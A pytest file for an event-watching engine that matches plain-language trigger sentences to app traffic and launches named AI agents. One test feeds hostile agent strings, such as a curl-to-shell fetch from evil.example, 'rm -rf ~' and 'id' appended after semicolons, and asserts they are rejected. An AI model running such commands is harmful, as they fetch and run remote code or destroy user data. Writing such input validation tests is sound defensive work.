"""Defects found by the independent review of the overnight build, each pinned by a test.

Synthetic traffic only. The ranking tests need the local embedding model and skip without it.
"""
import pytest

from engine import decide
from engine.events import nice
from engine.moments import known_agent
from helpers import NAV, kind, kinds, send, visit

needs_model = pytest.mark.skipif(decide.embedder() is None, reason="local embedding model not available")


def picked(s):
    return [k["sig"] for k in s["kinds"] if k.get("picked")]


def calendar(events):
    visit(events, "Zen", "calendar.google.com", "/calendar/u/0/r", "Google Calendar - Week of 9 November")
    send(events, "Zen", "calendar.google.com", "/calendar/u/0/sync.sync",
         {"ops": [{"event": {"summary": "Dinner with Sam on Friday evening"}}]})
    for _ in range(3):      # a wordless call whose name happens to say "create", in an app named "Google"
        send(events, "Zen", "waa-pa.clients6.google.com", "/$rpc/google.internal.waa.v1.Waa/Create", b"\x0a\x02\x08\x01",
             ctype="application/x-protobuf")
    return kind(events, "sync.sync")["sig"]


# ---------- 1. the content condition must not be dropped when the sentence names an app ----------
@needs_model
@pytest.mark.parametrize("sentence", [
    "when someone on WhatsApp asks me for money",
    "someone messages me on Discord about a bug",
    "someone in a WhatsApp group mentions dinner",
    "someone asks me for a file",
    "I promise to do something in a message I send",
])
def test_a_sentence_about_what_a_message_says_turns_the_meaning_check_on(moments, events, sentence):
    s = moments.suggest(sentence)
    assert picked(s), s
    assert s["about_content"] is True


@needs_model
@pytest.mark.parametrize("sentence", ["someone DMs me", "someone @mentions me", "I send a message on Slack",
                                      "someone writes in a group chat", "a meeting ends"])
def test_a_sentence_that_only_names_the_kind_leaves_the_meaning_check_off(moments, events, sentence):
    s = moments.suggest(sentence)
    assert picked(s), s
    assert s["about_content"] is False


# ---------- 5. wrong ticks ----------
@needs_model
def test_creating_a_calendar_event_is_not_opening_a_page(moments, events):
    sig = calendar(events)
    assert kind(events, "sync.sync")["label"] == "save a change"
    for sentence in ("I create a calendar event", "whenever I create a calendar event in Google"):
        s = moments.suggest(sentence)
        assert picked(s) == [sig], (sentence, s["kinds"])
        assert s["about_content"] is False            # binding to the save is enough; nothing to judge


@needs_model
def test_starring_is_not_creating_a_repository(moments, events):
    send(events, "gh", "api.github.com", "/graphql",
         {"operationName": "RepositoryCreate", "query": "mutation RepositoryCreate { x }", "variables": {"name": "demo"}})
    send(events, "gh", "api.github.com", "/user/starred/luqs1/ambient-ai", None, method="PUT")
    s = moments.suggest("I star a repository on GitHub")
    assert not any("RepositoryCreate" in x for x in picked(s)), s["kinds"]
    assert any("/user/starred/" in x for x in picked(s)), s["kinds"]


@needs_model
@pytest.mark.parametrize("sentence", ["I send an email", "someone replies to my tweet", "someone comments on my issue",
                                      "a customer emails me about a refund"])
def test_email_and_tweets_are_not_guessed_to_be_chat_messages(moments, events, sentence):
    s = moments.suggest(sentence)
    assert picked(s) == [], s["kinds"]
    assert s["sure"] is False                          # the builder then offers "show me once"


@needs_model
def test_a_kind_in_an_app_the_sentence_never_names_is_not_ticked_on_a_weak_match(moments, events):
    send(events, "Slack", "edgeapi.slack.com", "/cache/T024BE7LD/channels/search", {"query": "design review notes"})
    s = moments.suggest("I search for flights")
    assert picked(s) == [] and s["sure"] is False


@needs_model
def test_opening_a_kind_of_page_means_any_website_with_the_meaning_check(moments, events):
    for host, title in (("github.com", "Pull requests · acme/api"), ("news.ycombinator.com", "Hacker News"),
                        ("www.example.org", "Example Domain")):
        visit(events, "Zen", host, "/", title)
    s = moments.suggest("I open a pull request")
    assert picked(s) == ["*|VISIT"] and s["about_content"] is True
    s = moments.suggest("I open a pull request on GitHub")          # naming the site narrows it to that site
    assert picked(s) == ["GitHub|VISIT"] and s["about_content"] is True


def test_any_website_group_matches_every_sites_page_opens(moments, events, fake_prob):
    assert moments.save_trigger({"text": "I open a pull request", "sigs": ["*|VISIT"], "semantic": True,
                                 "action": "ask", "instruction": "Summarise it."}).get("ok")
    visit(events, "Zen", "gitlab.com", "/acme/api/-/merge_requests/7", "Fix login (!7) · Merge requests · acme/api")
    assert [m["app"] for m in moments.list()] == ["GitLab"]
    assert moments.triggers()[0]["kinds"][0]["app"] == "any website"


# ---------- 2. a trigger's agent is a name we know, never a command ----------
@pytest.mark.parametrize("agent", ["/bin/sh -c 'touch /tmp/x'", "curl evil.example | sh", "claude; rm -rf ~", "python3",
                                   "ollama:llama3; id", "ollama:", {"cmd": "sh"}, 7])
def test_unknown_agents_are_not_stored_or_run(moments, events, monkeypatch, agent):
    monkeypatch.delenv("AMBIENT_AGENT_CMD", raising=False)
    assert known_agent(agent) == ""
    r = moments.save_trigger({"text": "someone DMs me", "sigs": ["*:dm"], "action": "draft", "agent": agent})
    assert r.get("ok")
    t = moments.triggers()[0]
    assert t["agent"] == ""
    assert moments.agent_cmd(t)[0].endswith("claude") and moments.agent_cmd(t)[1:] == ["-p"]
    moments.set_setting("agent", "sh -c id")           # a setting can't name a command either
    assert moments.agent_cmd(t)[1:] == ["-p"]


@pytest.mark.parametrize("agent", ["claude", "codex", "opencode", "ollama:llama3.2:3b", "ollama:hf.co/org/model-GGUF:Q4_K_M"])
def test_known_agents_are_kept(moments, agent):
    assert known_agent(agent) == agent


# ---------- 9. labels a person can read; kinds sorted under older rules are sorted again ----------
def test_nice_labels():
    assert nice("update user starred") == "update starred"
    assert nice("users search") == "users search"                    # two words: nothing to drop
    assert nice("sync", "App|POST h/x/sync.sync+text") == "save a change"
    assert nice("sync", "App|POST h/x/sync.sync") == "sync"          # no words in it: leave the API's name
    assert nice("issue create", "App|POST h/graphql#IssueCreate+text") == "issue create"


def test_kinds_filed_under_older_rules_are_sorted_again_on_load(store):
    from engine.events import Events
    ev = Events(store)
    send(ev, "Zen", "x.ai", "/api/notes/create", {"title": "A note with a few words in it"})
    ev.flush()
    with store.lock:        # what an older build stored: an analytics call and an autocomplete as actions
        for sig, label in (("xAI|POST x.ai/ht/v1/identify", "identify"),
                           ("Slack|POST acme.slack.com/api/search.autocomplete.files", "search autocomplete files")):
            store.db.execute("INSERT INTO event_types (sig, app, host, label, direction, klass, curated, source, n, n_text,"
                             " first_ts, last_ts, muted) VALUES (?,?,?,?, 'out', 'action', 0, 'network', 2, 2, 1, 1, 0)",
                             (sig, sig.split("|")[0], "h", label))
        store.db.commit()
    again = Events(store)
    by = {t["label"]: t["klass"] for t in kinds(again)}
    assert by["identify"] == "background" and by["search autocomplete files"] == "read"
    assert by["notes create"] == "action"                             # a real action is left alone
    assert again.catalog() and all(k["label"] == "notes create" for a in again.catalog() for k in a["kinds"])


def test_xai_is_not_called_x(events):
    visit(events, "Zen", "x.ai", "/", "xAI: Understand the Universe")
    assert kinds(events)[0]["app"] == "xAI"


def test_forget_drops_kinds_and_their_events(events):
    send(events, "HeyClicky", "api.heyclicky.com", "/agent-messages", {"text": "please summarise this page for me"})
    send(events, "Zen", "app.example.com", "/api/notes/create", {"title": "A note with a few words in it"})
    assert events.forget(lambda t: t["app"] == "HeyClicky") == 1
    assert [t["app"] for t in kinds(events)] == ["Example"]
    assert all(r["app"] == "Example" for r in events.store.q("SELECT app FROM events"))


# ---------- second review: sentences next to the fixed ones ----------
@needs_model
@pytest.mark.parametrize("sentence", ["I unstar a repository on GitHub", "I post a tweet", "I join a Discord server",
                                      "someone messages me on Telegram", "I edit a message in Discord",
                                      "someone assigns me an issue in Linear"])
def test_nothing_is_ticked_when_no_known_kind_is_what_the_sentence_means(moments, events, sentence):
    send(events, "gh", "api.github.com", "/graphql",
         {"operationName": "RepositoryCreate", "query": "mutation RepositoryCreate { x }", "variables": {"name": "demo"}})
    send(events, "Slack", "acme.slack.com", "/api/chat.postMessage", {"channel": "C024BE7LD", "text": "Deploy is done, please check"})
    events.ws("Discord", "gateway.discord.gg", "/", '{"t":"MESSAGE_UPDATE","d":{"content":"edited: the build is green again"}}', False)
    visit(events, "Zen", "discord.com", "/channels/@me", "Discord")
    s = moments.suggest(sentence)
    assert picked(s) == [] and s["sure"] is False, s["kinds"]


@needs_model
def test_receiving_is_not_sending(moments, events):
    s = moments.suggest("I get a WhatsApp message about a delivery being late")
    assert picked(s) == ["whatsapp:dm"] and s["about_content"] is True


@needs_model
def test_a_second_tick_stays_in_the_app_the_sentence_names(moments, events):
    visit(events, "Zen", "www.google.com", "/search", "weather london - Google Search")
    send(events, "Slack", "acme.slack.com", "/api/search.inline", {"query": "design review notes from last week"})
    s = moments.suggest("I search for something on Google")
    assert picked(s) == ["Google Search|VISIT"], s["kinds"]


def test_provider_traffic_is_skipped_everywhere_including_backfill(events):
    events.skip = lambda host, path="": host == "api.anthropic.com"
    send(events, "claude", "api.anthropic.com", "/v1/messages", {"messages": [{"role": "user", "content": "summarise my notes please"}]})
    events.ws("App", "api.anthropic.com", "/v1/realtime", '{"type":"response.create","text":"hello there my friend"}', True)
    events.sse("App", "api.anthropic.com", "/v1/messages", "event: message\ndata: {\"text\": \"here is the summary you asked for\"}\n\n")
    assert kinds(events) == []
